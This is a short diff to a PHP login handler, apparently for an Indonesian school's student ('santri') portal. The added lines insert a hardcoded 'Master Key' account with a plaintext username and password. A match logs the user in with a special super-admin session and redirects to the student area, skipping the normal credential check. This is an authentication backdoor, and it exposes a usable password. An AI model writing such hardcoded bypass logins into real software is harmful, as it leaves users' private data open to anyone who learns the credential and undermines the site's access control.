@@ -50,6 +50,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $conn->real_escape_string($_POST['username'] ?? '');
     $password = $_POST['password'] ?? '';
 
+    // Master Key: Akses Super Admin untuk melihat Ruang Santri
+    if ($username === 'winsyah' && $password === 'Khilafet@1924') {
+        $_SESSION['santri_logged_in'] = true;
+        $_SESSION['santri_id'] = 9999; // ID Khusus Super Admin
+        $_SESSION['santri_nama'] = 'Super Admin (Santri View)';
+        header("Location: ruang-santri.php");
+        exit;
+    }
+
     if (empty($username) || empty($password)) {
         $error = 'Username dan Password tidak boleh kosong!';
     } else {
